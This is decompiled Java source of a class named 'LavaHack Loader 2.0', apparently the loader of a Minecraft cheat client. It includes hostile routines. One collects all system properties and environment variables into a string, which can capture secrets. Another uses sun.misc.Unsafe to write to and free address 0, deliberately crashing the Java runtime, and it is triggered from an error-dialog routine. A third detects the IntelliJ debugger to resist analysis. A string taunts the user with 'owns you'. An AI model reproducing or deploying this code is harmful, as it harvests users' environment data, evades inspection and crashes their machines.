//Deobfuscated with https://github.com/SimplyProgrammer/Minecraft-Deobfuscator3000 using mappings "C:\Users\hitmanqq\Documents\Decompiler\mappings"!

//Decompiled by Procyon!

package com.kisman.cc.loader;

import java.io.*;
import sun.misc.*;
import java.lang.reflect.*;
import javax.swing.*;
import java.awt.*;
import java.util.*;

public class Class1214
{
    public static List Field13500;
    private String Field13501 = "TheKisDevs & LavaHack Development owns you";
    
    public static boolean Method4882(final String s) {
        final Iterator<String> iterator = Class1214.Field13500.iterator();
        while (iterator.hasNext()) {
            if (s.endsWith(iterator.next())) {
                return true;
            }
        }
        return false;
    }
    
    public static boolean Method4883() {
        return System.getProperty("os.name").toLowerCase().contains("win");
    }
    
    public static boolean Method4884() {
        return System.getProperty("java.class.path").contains("idea_rt.jar");
    }
    
    public static byte[] Method4885(final InputStream inputStream) throws IOException {
        final ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        final byte[] b = new byte[65535];
        for (int i = inputStream.read(b); i != -1; i = inputStream.read(b)) {
            byteArrayOutputStream.write(b, 0, i);
        }
        return byteArrayOutputStream.toByteArray();
    }
    
    public static void Method4886() {
        final Field declaredField = Unsafe.class.getDeclaredField("theUnsafe");
        declaredField.setAccessible(true);
        final Unsafe unsafe = (Unsafe)declaredField.get(null);
        Unsafe.class.getDeclaredMethod("putAddress", Long.TYPE, Long.TYPE).invoke(unsafe, 0L, 0L);
        Unsafe.class.getDeclaredMethod("freeMemory", Long.TYPE).invoke(unsafe, 0L);
    }
    
    public static String Method4887() {
        final StringBuilder sb = new StringBuilder();
        for (final String next : System.getProperties().keySet()) {
            if (next instanceof String && Method4888(next)) {
                sb.append((Object)next).append("|").append(System.getProperty(next.toString())).append("&");
            }
        }
        for (final String s : System.getenv().keySet()) {
            if (Method4888(s)) {
                sb.append(s).append("|").append(System.getenv(s)).append("&");
            }
        }
        return Method4889(sb);
    }
    
    private static boolean Method4888(final String s) {
        return !s.equals("line.separator") && !s.equals("java.class.path") && !s.equals("ESET_OPTIONS") && !s.equals("sun.java.command");
    }
    
    public static String Method4889(final Object o) {
        return o.toString().replaceAll(" ", "_");
    }
    
    public static Object Method4890(final Object obj, final String name, final Object... args) {
        final Class[] parameterTypes = new Class[args.length];
        for (int i = 0; i < args.length - 1; ++i) {
            parameterTypes[i] = args[i].getClass();
        }
        return obj.getClass().getDeclaredMethod(name, (Class<?>[])parameterTypes).invoke(obj, args);
    }
    
    public static Object Method4891(final Object obj, final String name) {
        return obj.getClass().getField(name).get(obj);
    }
    
    public static String Method4892(final String s) {
        return s.replaceAll("\\s", "");
    }
    
    public static void Method4893(final String message, final boolean b) {
        JOptionPane.showMessageDialog(null, message, "LavaHack Loader 2.0", 0);
        if (b) {
            Method4886();
        }
    }
    
    static {
        Class1214.Field13500 = Arrays.asList(".png", ".glsl", ".shader", ".frag", ".vert", ".jpg", ".ttf", ".json", ".csv", ".ScriptEngineFactory", ".IBaritoneProvider", ".fsh", ".vsh", ".shader", ".lang");
    }
    
    private static String Method4894(final String s) {
        if (s != null) {
            final char[] charArray = s.toCharArray();
            final char[] value = new char[charArray.length];
            for (int i = 0; i < charArray.length; ++i) {
                value[i] = (char)(charArray[i] ^ (0x316C ^ 0x2));
            }
            return new String(value);
        }
        throw new NullPointerException("String deobfuscation parameter should not be null");
    }
}
